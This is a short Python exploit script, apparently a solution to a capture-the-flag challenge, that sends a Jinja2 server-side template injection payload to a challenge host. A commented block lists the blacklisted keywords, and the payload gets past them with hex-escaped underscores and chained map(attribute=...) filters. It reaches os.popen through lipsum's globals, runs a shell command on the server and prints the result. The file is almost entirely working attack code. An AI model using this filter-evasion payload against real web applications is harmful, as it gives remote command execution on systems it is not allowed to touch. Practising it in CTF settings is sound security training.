import requests
from urllib.parse import quote_plus

"""
black list
{
    '.','_','|join',
    '[', ']', 'mro',
    'base','import',
    'builtins','attr',
    'request','application',
    'getitem','render_template'
}
"""

cmd = 'ls templates'

payload = (r"""
{{
    (
        (
            (
                (lipsum,)
                |map(**{"at"+"tribute" : "\x5F\x5Fglobals\x5F\x5F"})
                |map(**{"at"+"tribute" : "os"})
                |map(**{"at"+"tribute" : "popen"})
                |list|last)("%s"),)
                |map(**{"at"+"tribute" : "read"})
                |list|last)()
}}
""" % cmd).replace('\n', '')

# req = requests.get(f"http://127.0.0.1:3000/follow_the_light?input={quote_plus(payload)}")
req = requests.get(f"http://pipe-your-way.chal.ctf.gdgalgiers.com/follow_the_light?input={quote_plus(payload)}")

print(req.text)
